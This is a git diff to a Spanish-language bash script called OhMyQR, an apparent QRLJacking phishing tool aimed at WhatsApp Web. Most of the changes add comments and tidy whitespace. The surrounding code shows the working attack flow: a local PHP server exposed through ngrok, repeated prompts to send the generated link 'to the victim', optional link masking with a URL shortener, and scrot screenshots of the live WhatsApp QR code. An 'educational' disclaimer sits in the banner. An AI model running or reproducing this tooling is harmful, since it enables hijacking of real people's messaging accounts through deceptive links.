@@ -1,5 +1,6 @@
 #!/bin/bash
 
+#Uso de no root
 if [ "$(id -u)" != "1000" ]; then
    echo "Ejecuta este script como usuario sin privilegios (su nombreusuario o exit)."
    exit 1
@@ -8,7 +9,7 @@ fi
 
 trap 'printf "\n";stop;exit 1' 2
 
-
+#Verifica dependencias
 dependencies() {
 
 command -v php > /dev/null 2>&1 || { echo >&2 "Se requiere de php pero no esta instalado, ejecuta el instalador."; exit 1; }
@@ -21,6 +22,7 @@ command -v xdotool > /dev/null 2>&1 || { echo >&2 "Se requiere de xdotool pero n
 
 stop() {
 
+#Verifica estados de servicios que se usaran
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -59,7 +61,7 @@ scrot -u tmp.jpg
 done
 
 }
-
+#Menu
 banner() {
 printf "\n"
 printf "\e[1;77m .d88888b.  888      888b     d888           .d88888b.  8888888b.   \n"
@@ -77,12 +79,12 @@ printf '                                    \"Y88P\" v1.2                     \e
 printf "\n"
 printf "\e[1;93m  ::: Mejorado: @AnibalTlgram\e[0m\n"
 printf "\n"
-printf "  \e[101m\e[1;77m:: Descargo: No asumo, ni me hago responsable del uso    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: o el daño que causen con OhMyQR , es un script educativo     ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: Descargo: No asumo, ni me hago responsable del uso o el   ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: daño que puedan causar con OhMyQR,es un script educativo  ::\e[0m\n"
 printf "\n"
 }
 
-
+#Sitio a escoger
 website() {
 
 default_website="https://web.whatsapp.com"
@@ -91,7 +93,7 @@ website="${website:-${default_website}}"
 
 }
 
-
+#Inicia el servidor de serveo que no funciona
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
@@ -121,7 +123,7 @@ scrot_screen
 }
 
 
-
+#Inicia la descarga de ngrok por si no se tiene descarga el necesario para tu equipo
 start() {
 
 
@@ -160,6 +162,7 @@ fi
 fi
 fi
 
+#Inicia el servidor de php para subir los archivos y luego ngrok
 printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
@@ -167,24 +170,19 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
+#Filtra los links de ngrok
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Memoriza este link y enviaselo a la victima:\e[0m\e[1;77m %s\e[0m\n" $link
 
-
-
-
-
-
-
-		read -p $'\e[1;92m[\e[0m*\e[1;92m] Deseas ocultar/enmascarar el link? si/no:\e[1;39m ' cho
+#Pregunta para enmascarar el link
+read -p $'\e[1;92m[\e[0m*\e[1;92m] Deseas ocultar/enmascarar el link? si/no:\e[1;39m ' cho
            
-            
-       		
-		case "$cho" in
+#Si la opcion es si inicia proceso de enmascarar link
+	case "$cho" in
 
-		s|S|Si|si|SI)
-		lnk=$?
-		if [ "$lnk" ==  "0" ];then
+	s|S|Si|si|SI)
+	lnk=$?
+	if [ "$lnk" ==  "0" ];then
 
 
 url_checker() {
@@ -215,34 +213,16 @@ final=$mask-$words@$shorter
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Memoriza este link y enviaselo a la victima:\e[32m ${final} \e[0m\n"
 
+#Si la opcion no sigue el script
+
+	fi
+	;;
+
+	n|no|No|NO)
+	esac
 
 
-
-
-
-
-		fi
-		;;
-
-		n|no|No|NO)
-		esac
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#Inicia firefox en la pagina seleccionada
 printf "\n"
 printf "\e[1;77m[!] Ahora, se abrira Firefox en modo pantalla completa. Envia el link al obejtivo despues.\e[0m"
 read -p $'\e[1;77m Ok?\e[0m' -n 1 -r
@@ -260,7 +240,7 @@ if [[ -e tmp.jpg ]]; then
 rm -rf tmp.jpg
 fi
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (No funciona :( )\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (No funciona)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoge una opcion de Port Forwarding: \e[0m\en' option_server
@@ -284,4 +264,3 @@ fi
 banner
 dependencies
 start1
-
